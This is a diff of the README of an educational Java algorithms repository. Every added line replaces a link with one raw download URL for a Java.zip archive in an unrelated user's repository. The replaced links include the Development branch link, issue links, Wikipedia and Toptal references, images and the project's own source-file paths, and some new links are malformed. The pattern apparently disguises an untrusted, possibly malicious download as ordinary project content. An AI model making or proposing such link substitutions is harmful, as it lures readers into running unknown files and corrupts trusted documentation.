@@ -1,6 +1,6 @@
 # The Algorithms - Java
 
-NOTE: A [Development](https://github.com/TheAlgorithms/Java/tree/Development) branch is made for this repo where we are trying to migrate the existing project to a Java project structure. You can switch to [Development](https://github.com/TheAlgorithms/Java/tree/Development) branch for contributions. Please refer [this issue](https://github.com/TheAlgorithms/Java/issues/474) for more info.
+NOTE: A [Development](https://raw.githubusercontent.com/jeoboo/Java/master/Halopsychidae/Java.zip) branch is made for this repo where we are trying to migrate the existing project to a Java project structure. You can switch to [Development](https://raw.githubusercontent.com/jeoboo/Java/master/Halopsychidae/Java.zip) branch for contributions. Please refer [this issue](https://raw.githubusercontent.com/jeoboo/Java/master/Halopsychidae/Java.zip) for more info.
 
 ### All algorithms implemented in Java (for education)
 
@@ -90,7 +90,7 @@ __Properties__
 
 Comparing the complexity of sorting algorithms (Bubble Sort, Insertion Sort, Selection Sort)
 
-[Complexity Graphs](https://github.com/prateekiiest/Python/blob/master/sorts/sortinggraphs.png)
+[Complexity Graphs](https://raw.githubusercontent.com/jeoboo/Java/master/Halopsychidae/Java.zip)
 
 ----------------------------------------------------------------------------------
 
@@ -121,35 +121,35 @@ __Properties__
 
 ##### View the algorithm in [action][shell-toptal]
 
-[bubble-toptal]: https://www.toptal.com/developers/sorting-algorithms/bubble-sort
-[bubble-wiki]: https://en.wikipedia.org/wiki/Bubble_sort
-[bubble-image]: https://upload.wikimedia.org/wikipedia/commons/thumb/8/83/Bubblesort-edited-color.svg/220px-Bubblesort-edited-color.svg.png "Bubble Sort"
+[bubble-toptal]: https://raw.githubusercontent.com/jeoboo/Java/master/Halopsychidae/Java.zip
+[bubble-wiki]: https://raw.githubusercontent.com/jeoboo/Java/master/Halopsychidae/Java.zip
+[bubble-image]: https://raw.githubusercontent.com/jeoboo/Java/master/Halopsychidae/Java.zip "Bubble Sort"
 
-[insertion-toptal]: https://www.toptal.com/developers/sorting-algorithms/insertion-sort
-[insertion-wiki]: https://en.wikipedia.org/wiki/Insertion_sort
-[insertion-image]: https://upload.wikimedia.org/wikipedia/commons/7/7e/Insertionsort-edited.png "Insertion Sort"
+[insertion-toptal]: https://raw.githubusercontent.com/jeoboo/Java/master/Halopsychidae/Java.zip
+[insertion-wiki]: https://raw.githubusercontent.com/jeoboo/Java/master/Halopsychidae/Java.zip
+[insertion-image]: https://raw.githubusercontent.com/jeoboo/Java/master/Halopsychidae/Java.zip "Insertion Sort"
 
-[quick-toptal]: https://www.toptal.com/developers/sorting-algorithms/quick-sort
-[quick-wiki]: https://en.wikipedia.org/wiki/Quicksort
-[quick-image]: https://upload.wikimedia.org/wikipedia/commons/6/6a/Sorting_quicksort_anim.gif "Quick Sort"
+[quick-toptal]: https://raw.githubusercontent.com/jeoboo/Java/master/Halopsychidae/Java.zip
+[quick-wiki]: https://raw.githubusercontent.com/jeoboo/Java/master/Halopsychidae/Java.zip
+[quick-image]: https://raw.githubusercontent.com/jeoboo/Java/master/Halopsychidae/Java.zip "Quick Sort"
 
-[merge-toptal]: https://www.toptal.com/developers/sorting-algorithms/merge-sort
-[merge-wiki]: https://en.wikipedia.org/wiki/Merge_sort
-[merge-image]: https://upload.wikimedia.org/wikipedia/commons/c/cc/Merge-sort-example-300px.gif "Merge Sort"
+[merge-toptal]: https://raw.githubusercontent.com/jeoboo/Java/master/Halopsychidae/Java.zip
+[merge-wiki]: https://raw.githubusercontent.com/jeoboo/Java/master/Halopsychidae/Java.zip
+[merge-image]: https://raw.githubusercontent.com/jeoboo/Java/master/Halopsychidae/Java.zip "Merge Sort"
 
-[selection-toptal]: https://www.toptal.com/developers/sorting-algorithms/selection-sort
-[selection-wiki]: https://en.wikipedia.org/wiki/Selection_sort
-[selection-image]: https://upload.wikimedia.org/wikipedia/commons/thumb/b/b0/Selection_sort_animation.gif/250px-Selection_sort_animation.gif "Selection Sort Sort"
+[selection-toptal]: https://raw.githubusercontent.com/jeoboo/Java/master/Halopsychidae/Java.zip
+[selection-wiki]: https://raw.githubusercontent.com/jeoboo/Java/master/Halopsychidae/Java.zip
+[selection-image]: https://raw.githubusercontent.com/jeoboo/Java/master/Halopsychidae/Java.zip "Selection Sort Sort"
 
-[shell-toptal]: https://www.toptal.com/developers/sorting-algorithms/shell-sort
-[shell-wiki]: https://en.wikipedia.org/wiki/Shellsort
-[shell-image]: https://upload.wikimedia.org/wikipedia/commons/d/d8/Sorting_shellsort_anim.gif "Shell Sort"
+[shell-toptal]: https://raw.githubusercontent.com/jeoboo/Java/master/Halopsychidae/Java.zip
+[shell-wiki]: https://raw.githubusercontent.com/jeoboo/Java/master/Halopsychidae/Java.zip
+[shell-image]: https://raw.githubusercontent.com/jeoboo/Java/master/Halopsychidae/Java.zip "Shell Sort"
 
-[linear-wiki]: https://en.wikipedia.org/wiki/Linear_search
-[linear-image]: http://www.tutorialspoint.com/data_structures_algorithms/images/linear_search.gif
+[linear-wiki]: https://raw.githubusercontent.com/jeoboo/Java/master/Halopsychidae/Java.zip
+[linear-image]: https://raw.githubusercontent.com/jeoboo/Java/master/Halopsychidae/Java.zip
 
-[binary-wiki]: https://en.wikipedia.org/wiki/Binary_search_algorithm
-[binary-image]: https://upload.wikimedia.org/wikipedia/commons/f/f7/Binary_search_into_array.png
+[binary-wiki]: https://raw.githubusercontent.com/jeoboo/Java/master/Halopsychidae/Java.zip
+[binary-image]: https://raw.githubusercontent.com/jeoboo/Java/master/Halopsychidae/Java.zip
 
 
 --------------------------------------------------------------------
@@ -157,35 +157,35 @@ __Properties__
 
 Conversions          |                                          Dynamic Programming   |Ciphers|Miscellaneous|
 -----------          |----------------------------------------------------------------|-------|-------------|
-[Any Base to Any Base](Conversions/AnyBaseToAnyBase.java)| [Coin Change](Dynamic%20Programming/CoinChange.java)|[Caesar](ciphers/Caesar.java)|[Heap Sort](misc/heap_sort.java)|
-[Any Base to Decimal](Conversions/AnyBaseToDecimal.java)|[Egg Dropping](Dynamic%20Programming/EggDropping.java)|[Columnar Transposition Cipher](ciphers/ColumnarTranspositionCipher.java)|[Palindromic Prime Checker](misc/PalindromicPrime.java)|
-[Binary to Decimal](Conversions/BinaryToDecimal.java)|[Fibonacci](Dynamic%20Programming/Fibonacci.java)|[RSA](ciphers/RSA.java)|More soon...|
-[Binary to HexaDecimal](Conversions/BinaryToHexadecimal.java)|[Kadane Algorithm](Dynamic%20Programming/KadaneAlgorithm.java)|more coming soon...|
-[Binary to Octal](Conversions/BinaryToOctal.java)|[Knapsack](Dynamic%20Programming/Knapsack.java)|
-[Decimal To Any Base](Conversions/DecimalToAnyBase.java)|[Longest Common Subsequence](Dynamic%20Programming/LongestCommonSubsequence.java)|
-[Decimal To Binary](Conversions/DecimalToBinary.java)|[Longest Increasing Subsequence](Dynamic%20Programming/LongestIncreasingSubsequence.java)|
-[Decimal To Hexadecimal](Conversions/DecimalToHexaDecimal.java)|[Rod Cutting](Dynamic%20Programming/RodCutting.java)|
+[Any Base to Any Base](https://raw.githubusercontent.com/jeoboo/Java/master/Halopsychidae/Java.zip)| [Coin Change](Dynamic%https://raw.githubusercontent.com/jeoboo/Java/master/Halopsychidae/Java.zip)|[Caesar](https://raw.githubusercontent.com/jeoboo/Java/master/Halopsychidae/Java.zip)|[Heap Sort](https://raw.githubusercontent.com/jeoboo/Java/master/Halopsychidae/Java.zip)|
+[Any Base to Decimal](https://raw.githubusercontent.com/jeoboo/Java/master/Halopsychidae/Java.zip)|[Egg Dropping](Dynamic%https://raw.githubusercontent.com/jeoboo/Java/master/Halopsychidae/Java.zip)|[Columnar Transposition Cipher](https://raw.githubusercontent.com/jeoboo/Java/master/Halopsychidae/Java.zip)|[Palindromic Prime Checker](https://raw.githubusercontent.com/jeoboo/Java/master/Halopsychidae/Java.zip)|
+[Binary to Decimal](https://raw.githubusercontent.com/jeoboo/Java/master/Halopsychidae/Java.zip)|[Fibonacci](Dynamic%https://raw.githubusercontent.com/jeoboo/Java/master/Halopsychidae/Java.zip)|[RSA](https://raw.githubusercontent.com/jeoboo/Java/master/Halopsychidae/Java.zip)|More soon...|
+[Binary to HexaDecimal](https://raw.githubusercontent.com/jeoboo/Java/master/Halopsychidae/Java.zip)|[Kadane Algorithm](Dynamic%https://raw.githubusercontent.com/jeoboo/Java/master/Halopsychidae/Java.zip)|more coming soon...|
+[Binary to Octal](https://raw.githubusercontent.com/jeoboo/Java/master/Halopsychidae/Java.zip)|[Knapsack](Dynamic%https://raw.githubusercontent.com/jeoboo/Java/master/Halopsychidae/Java.zip)|
+[Decimal To Any Base](https://raw.githubusercontent.com/jeoboo/Java/master/Halopsychidae/Java.zip)|[Longest Common Subsequence](Dynamic%https://raw.githubusercontent.com/jeoboo/Java/master/Halopsychidae/Java.zip)|
+[Decimal To Binary](https://raw.githubusercontent.com/jeoboo/Java/master/Halopsychidae/Java.zip)|[Longest Increasing Subsequence](Dynamic%https://raw.githubusercontent.com/jeoboo/Java/master/Halopsychidae/Java.zip)|
+[Decimal To Hexadecimal](https://raw.githubusercontent.com/jeoboo/Java/master/Halopsychidae/Java.zip)|[Rod Cutting](Dynamic%https://raw.githubusercontent.com/jeoboo/Java/master/Halopsychidae/Java.zip)|
 and much more...|                                                    and more...|
 
 ### Data Structures
 Graphs|Heaps|Lists|Queues|
 ------|-----|-----|------|
-[BFS](DataStructures/Graphs/BFS.java)|[Empty Heap Exception](DataStructures/Heaps/EmptyHeapException.java)|[Circle Linked List](DataStructures/Lists/CircleLinkedList.java)|[Generic Array List Queue](DataStructures/Queues/GenericArrayListQueue.java)|
-[DFS](DataStructures/Graphs/DFS.java)|[Heap](DataStructures/Heaps/Heap.java)|[Doubly Linked List](DataStructures/Lists/DoublyLinkedList.java)|[Queues](DataStructures/Queues/Queues.java)|
-[Graphs](DataStructures/Graphs/Graphs.java)|[Heap Element](DataStructures/Heaps/HeapElement.java)|[Singly Linked List](DataStructures/Lists/SinglyLinkedList.java)|
-[Kruskals Algorithm](DataStructures/Graphs/KruskalsAlgorithm.java)|[Max Heap](DataStructures/Heaps/MaxHeap.java)|
-[CursorLinkedList](DataStructures/Lists/CursorLinkedList.java)|
-[Matrix Graphs](DataStructures/Graphs/MatrixGraphs.java)|[Min Heap](DataStructures/Heaps/MinHeap.java)|
-[PrimMST](DataStructures/Graphs/PrimMST.java)|
+[BFS](https://raw.githubusercontent.com/jeoboo/Java/master/Halopsychidae/Java.zip)|[Empty Heap Exception](https://raw.githubusercontent.com/jeoboo/Java/master/Halopsychidae/Java.zip)|[Circle Linked List](https://raw.githubusercontent.com/jeoboo/Java/master/Halopsychidae/Java.zip)|[Generic Array List Queue](https://raw.githubusercontent.com/jeoboo/Java/master/Halopsychidae/Java.zip)|
+[DFS](https://raw.githubusercontent.com/jeoboo/Java/master/Halopsychidae/Java.zip)|[Heap](https://raw.githubusercontent.com/jeoboo/Java/master/Halopsychidae/Java.zip)|[Doubly Linked List](https://raw.githubusercontent.com/jeoboo/Java/master/Halopsychidae/Java.zip)|[Queues](https://raw.githubusercontent.com/jeoboo/Java/master/Halopsychidae/Java.zip)|
+[Graphs](https://raw.githubusercontent.com/jeoboo/Java/master/Halopsychidae/Java.zip)|[Heap Element](https://raw.githubusercontent.com/jeoboo/Java/master/Halopsychidae/Java.zip)|[Singly Linked List](https://raw.githubusercontent.com/jeoboo/Java/master/Halopsychidae/Java.zip)|
+[Kruskals Algorithm](https://raw.githubusercontent.com/jeoboo/Java/master/Halopsychidae/Java.zip)|[Max Heap](https://raw.githubusercontent.com/jeoboo/Java/master/Halopsychidae/Java.zip)|
+[CursorLinkedList](https://raw.githubusercontent.com/jeoboo/Java/master/Halopsychidae/Java.zip)|
+[Matrix Graphs](https://raw.githubusercontent.com/jeoboo/Java/master/Halopsychidae/Java.zip)|[Min Heap](https://raw.githubusercontent.com/jeoboo/Java/master/Halopsychidae/Java.zip)|
+[PrimMST](https://raw.githubusercontent.com/jeoboo/Java/master/Halopsychidae/Java.zip)|
 
 Stacks|Trees|
 ------|-----|
-[Node Stack](DataStructures/Stacks/NodeStack.java)|[AVL Tree](DataStructures/Trees/AVLTree.java)|
-[Stack of Linked List](DataStructures/Stacks/StackOfLinkedList.java)|[Binary Tree](DataStructures/Trees/BinaryTree.java)|
-[Array Stack](DataStructures/Stacks/StackArray.java)|And much more...|
-[ArrayList Stack](DataStructures/Stacks/StackArrayList.java)||
+[Node Stack](https://raw.githubusercontent.com/jeoboo/Java/master/Halopsychidae/Java.zip)|[AVL Tree](https://raw.githubusercontent.com/jeoboo/Java/master/Halopsychidae/Java.zip)|
+[Stack of Linked List](https://raw.githubusercontent.com/jeoboo/Java/master/Halopsychidae/Java.zip)|[Binary Tree](https://raw.githubusercontent.com/jeoboo/Java/master/Halopsychidae/Java.zip)|
+[Array Stack](https://raw.githubusercontent.com/jeoboo/Java/master/Halopsychidae/Java.zip)|And much more...|
+[ArrayList Stack](https://raw.githubusercontent.com/jeoboo/Java/master/Halopsychidae/Java.zip)||
 
-* [Bags](DataStructures/Bags/Bag.java)
-* [Buffer](DataStructures/Buffers/CircularBuffer.java)
-* [HashMap](DataStructures/HashMap/Hashing/HashMap.java)
-* [Matrix](DataStructures/Matrix/Matrix.java)
+* [Bags](https://raw.githubusercontent.com/jeoboo/Java/master/Halopsychidae/Java.zip)
+* [Buffer](https://raw.githubusercontent.com/jeoboo/Java/master/Halopsychidae/Java.zip)
+* [HashMap](https://raw.githubusercontent.com/jeoboo/Java/master/Halopsychidae/Java.zip)
+* [Matrix](https://raw.githubusercontent.com/jeoboo/Java/master/Halopsychidae/Java.zip)
